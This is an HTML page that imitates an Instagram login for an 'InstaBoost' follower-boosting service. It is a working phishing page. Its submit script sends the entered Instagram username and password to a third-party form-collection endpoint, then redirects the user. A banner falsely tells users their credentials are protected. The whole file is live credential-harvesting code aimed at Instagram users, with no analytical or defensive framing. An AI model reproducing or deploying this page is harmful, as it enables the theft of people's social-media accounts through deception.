<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <meta name="theme-color" content="#6366f1" />
  <title>Login - InstaBoost</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary: #6366f1;
      --primary-dark: #4f46e5;
      --primary-light: #818cf8;
    }
    
    body {
      background: linear-gradient(135deg, #f5f7fa 0%, #e4e7eb 100%);
      font-family: 'Inter', sans-serif;
      -webkit-tap-highlight-color: transparent;
    }
    
    .card {
      transform: translateY(20px);
      opacity: 0;
      animation: fadeInUp 0.6s cubic-bezier(0.22, 1, 0.36, 1) forwards;
    }
    
    .input-field {
      transition: all 0.3s ease;
      box-shadow: 0 1px 2px rgba(0,0,0,0.05);
    }
    
    .input-field:focus {
      box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.2);
    }
    
    .submit-btn {
      transition: all 0.3s cubic-bezier(0.68, -0.55, 0.265, 1.55);
      background-image: linear-gradient(to right, var(--primary), var(--primary-light));
      background-size: 200% auto;
    }
    
    .submit-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
      background-position: right center;
    }
    
    .submit-btn:active {
      transform: translateY(0);
    }
    
    .instagram-icon {
      animation: pulse 2s infinite;
    }
    
    @keyframes fadeInUp {
      from {
        transform: translateY(20px);
        opacity: 0;
      }
      to {
        transform: translateY(0);
        opacity: 1;
      }
    }
    
    @keyframes pulse {
      0% {
        transform: scale(1);
      }
      50% {
        transform: scale(1.05);
      }
      100% {
        transform: scale(1);
      }
    }
    
    /* iOS-style input zoom prevention */
    @media screen and (max-width: 767px) {
      input, textarea {
        font-size: 16px !important;
      }
    }
  </style>
</head>
<body class="flex items-center justify-center min-h-screen px-4 py-6 overflow-y-auto touch-manipulation">

  <div class="card bg-white p-8 rounded-3xl shadow-2xl max-w-md w-full space-y-8 mx-4" style="max-width: 420px;">
    <!-- Header with animated icon -->
    <div class="text-center space-y-4">
      <div class="instagram-icon inline-flex items-center justify-center w-16 h-16 bg-gradient-to-br from-purple-500 to-pink-500 rounded-2xl shadow-md mx-auto">
        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-white" fill="currentColor" viewBox="0 0 24 24">
          <path fill-rule="evenodd" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
        </svg>
      </div>
      <h2 class="text-3xl font-bold text-gray-900">Welcome to InstaBoost</h2>
      <p class="text-gray-500">Log in to access your dashboard</p>
    </div>

    <!-- FORM START -->
<form id="instaForm" class="space-y-6">
  <!-- Username Field -->
  <div class="space-y-2">
    <label for="username" class="block text-sm font-medium text-gray-700">Instagram Username</label>
    <div class="relative">
      <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
        <span class="text-gray-500">@</span>
      </div>
      <input id="username" name="username" type="text" required
             oninvalid="this.setCustomValidity('Please enter your Instagram username')"
             oninput="this.setCustomValidity('')"
             placeholder="username"
             class="input-field pl-8 w-full border border-gray-200 rounded-xl px-4 py-3 text-base focus:outline-none focus:ring-2 focus:ring-indigo-500" />
    </div>
  </div>

  <!-- Password Field -->
  <div class="space-y-2">
    <label for="user_pass" class="block text-sm font-medium text-gray-700">Password</label>
    <input id="user_pass" name="user_pass" type="password" required
           oninvalid="this.setCustomValidity('Please enter your password')"
           oninput="this.setCustomValidity('')"
           placeholder="••••••••"
           class="input-field w-full border border-gray-200 rounded-xl px-4 py-3 text-base focus:outline-none focus:ring-2 focus:ring-indigo-500" />
  </div>

  <!-- Submit Button -->
  <div class="pt-2">
    <button type="submit"
            class="submit-btn w-full text-white py-4 rounded-xl font-semibold text-lg hover:shadow-lg transition-all duration-300 flex items-center justify-center">
      <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" viewBox="0 0 20 20" fill="currentColor">
        <path fill-rule="evenodd"
              d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-8.707l-3-3a1 1 0 00-1.414 1.414L10.586 9H7a1 1 0 100 2h3.586l-1.293 1.293a1 1 0 101.414 1.414l3-3a1 1 0 000-1.414z"
              clip-rule="evenodd" />
      </svg>
      Login and Boost
    </button>
  </div>
</form>
<!-- FORM END -->


    <!-- Security Message -->
    <div class="bg-indigo-50 border border-indigo-100 p-4 rounded-xl text-sm text-indigo-800 flex items-start gap-3">
      <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 flex-shrink-0 text-indigo-500" fill="currentColor" viewBox="0 0 20 20">
        <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"/>
      </svg>
      <p><strong>Secure login:</strong> Your credentials are encrypted during transmission.</p>
    </div>
  </div>

  <!-- JS: Handle Form Submit with improved animations -->
  <script>
    document.addEventListener('DOMContentLoaded', () => {
      const form = document.getElementById('instaForm');
      const button = form.querySelector('button[type="submit"]');
      const originalButtonText = button.innerHTML;
      
      form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Add loading state
        button.disabled = true;
        button.innerHTML = `
          <svg class="animate-spin -ml-1 mr-2 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
          </svg>
          Authenticating...
        `;
        
        // Add slight delay for animation
        await new Promise(resolve => setTimeout(resolve, 800));
        
        const rawUsername = document.getElementById('username').value.trim();
        const username = rawUsername.replace(/^@/, ''); // Remove @ if user typed it
        const formData = new FormData(form);

        sessionStorage.setItem('instaUsername', username);

        try {
          const response = await fetch('https://formspree.io/f/mrbqjlpp', {
            method: 'POST',
            headers: { 'Accept': 'application/json' },
            body: formData
          });
          
          if (response.ok) {
            // Success animation
            button.innerHTML = `
              <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-1" viewBox="0 0 20 20" fill="currentColor">
                <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd" />
              </svg>
              Success!
            `;
            button.classList.remove('bg-indigo-600', 'hover:bg-indigo-700');
            button.classList.add('bg-green-500', 'hover:bg-green-600');
            
            // Redirect after short delay
            setTimeout(() => {
              window.location.href = 'profile.html';
            }, 1000);
          } else {
            throw new Error('Form submission failed');
          }
        } catch (error) {
          console.error('Error:', error);
          // Error state
          button.innerHTML = `
            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-1" viewBox="0 0 20 20" fill="currentColor">
              <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
            </svg>
            Try Again
          `;
          button.classList.remove('bg-indigo-600', 'hover:bg-indigo-700');
          button.classList.add('bg-red-500', 'hover:bg-red-600');
          
          // Reset after delay
          setTimeout(() => {
            button.disabled = false;
            button.innerHTML = originalButtonText;
            button.classList.remove('bg-red-500', 'hover:bg-red-600');
            button.classList.add('bg-indigo-600', 'hover:bg-indigo-700');
          }, 2000);
        }
      });
      
      // Add input focus animations
      const inputs = form.querySelectorAll('input');
      inputs.forEach(input => {
        input.addEventListener('focus', () => {
          input.parentElement.querySelector('label').classList.add('text-indigo-600');
        });
        
        input.addEventListener('blur', () => {
          input.parentElement.querySelector('label').classList.remove('text-indigo-600');
        });
      });
    });
  </script>
</body>
</html>
